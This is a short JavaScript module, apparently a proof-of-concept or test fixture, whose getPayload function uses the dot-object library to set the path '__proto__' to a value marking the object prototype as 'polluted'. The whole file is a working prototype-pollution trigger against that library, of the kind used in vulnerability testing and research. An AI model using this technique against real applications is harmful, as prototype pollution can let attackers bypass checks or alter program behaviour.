function getPayload() {
    var a = require("dot-object");
    var obj = {};
    var path = "__proto__";

    var val = { polluted: "yes" };
    a.set(path, val, {}, true);

    return { obj };
}

module.exports = { getPayload };